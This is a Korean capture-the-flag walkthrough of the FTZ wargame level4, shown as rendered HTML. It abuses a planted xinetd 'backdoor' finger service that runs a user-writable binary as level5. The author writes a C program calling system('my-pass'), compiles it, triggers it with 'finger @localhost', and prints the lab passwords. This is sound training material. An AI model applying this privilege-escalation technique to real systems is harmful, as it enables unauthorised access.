@@ -1,0 +1,99 @@
+I"�<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level4
+level4@~~~~<span class="s1">'s password:
+[level4@ftz level4]$
+</span></code></pre></div></div>
+
+<p>level4/suck my brain으로 접속하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hint public_html tmp
+<span class="o">[</span>level4@ftz level4]<span class="nv">$ </span><span class="nb">cat </span>hint
+
+누군가 /etc/xinetd.d/에 백도어를 심어놓았다!
+
+
+<span class="o">[</span>level4@ftz level4]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>백도어를 심어놨다면 그걸 이용해서 level5의 권한을 얻어낼 수 있을 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level4
+level4@~~~~<span class="s1">'s password:
+[level4@ftz level4]$[level4@ftz level4]$ cd /etc/xinetd.d 
+[level4@ftz xinetd.d]$ ls 
+backdoor     daytime      echo-udp  rexec   rsync     sgi_fam  time 
+chargen      daytime-udp  finger    rlogin  servers   talk     time-udp 
+chargen-udp  echo         ntalk     rsh     services  telnet 
+[level4@ftz xinetd.d]$
+</span></code></pre></div></div>
+
+<p>가장 앞에 backdoor 파일이 보인다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level4
+level4@~~~~<span class="s1">'s password:
+[level4@ftz level4]$[level4@ftz xinetd.d]$ cat backdoor 
+service finger 
+{ 
+        disable = no 
+        flags           = REUSE 
+        socket_type     = stream 
+        wait            = no 
+        user            = level5 
+        server          = /home/level4/tmp/backdoor 
+        log_on_failure  += USERID 
+} 
+[level4@ftz xinetd.d]$
+</span></code></pre></div></div>
+
+<p>백도어를 읽으면 이렇게 나온다. 아무래도 finger명령어를 설정해 주는 프로그램인 것 같아 보인다. finger 명령어에 대한 정보는 여기서 확인하자.</p>
+
+<p><a href="./https://geundi.tistory.com/45">https://geundi.tistory.com/45</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">user</span><span class="o">=</span> level5 
+<span class="nv">server</span><span class="o">=</span> /home/level4/tmp/backdoor
+</code></pre></div></div>
+
+<p>밑의 이 두 줄이 중요하다. 유저의 권한값을 level5를 줘서, /home/level4/tmp 안의 백도어를 실행시킨다는 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level4@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /home/level4/tmp 
+<span class="o">[</span>level4@ftz tmp]<span class="nv">$ </span><span class="nb">ls</span> 
+<span class="o">[</span>level4@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>그러나 tmp폴더 안에는 아무것도 들어있지 않다. finger 명령어가 backdoor 파일을 실행시킬 수 있게, 우리가 직접 프로그래밍을 해주자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level4@ftz tmp]<span class="nv">$ </span>vi backdoor.c 
+<span class="o">[</span>level4@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>backdoor.c 
+<span class="c">#include &lt;stdio.h&gt;</span>
+int main<span class="o">()</span> 
+<span class="o">{</span> 
+        system<span class="o">(</span><span class="s2">"my-pass"</span><span class="o">)</span><span class="p">;</span> 
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>개인적으로 리눅스에서 프로그래밍을 할 때에는 vi편집기가 가장 편하다고 생각한다.</p>
+
+<p>위와 같이 c 프로그래밍을 해 주고, 컴파일을 해 실행파일을 만들자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level4@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> backdoor backdoor.c 
+<span class="o">[</span>level4@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>c 소스를 컴파일 할 때에는 gcc -o (만들 실행파일 이름) (소스 파일 이름)을 사용해 주면 된다.</p>
+
+<p>finger이 실행할 파일명은 backdoor이므로 만들 실행파일은 backdoor로 해 주자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level4@ftz tmp]<span class="nv">$ </span>finger @localhost 
+^[[H^[[J 
+Level5 Password is <span class="s2">"what is your name?"</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>그 뒤, finger 명령어를 실행시킨다. 여기서 @localhost를 써주는 이유는, finger을 로컬로 보내 level5의 권한으로</p>
+
+<p>my-pass 명령을 실행시키게 해주기 위함이다.</p>
+
+<p>http://www.hackerschool.org/HS_Boards/zboard.php?id=QNA_level&amp;page=1&amp;sn1=&amp;divpage=1&amp;sn=off&amp;ss=on&amp;sc=on&amp;select_arrange=headnum&amp;desc=asc&amp;no=3247</p>
+
+<p>이해가 잘 되지 않는다면 참고하시길.</p>
+
+<p>level5’s password:”what is your name?”</p>
+
+:ET
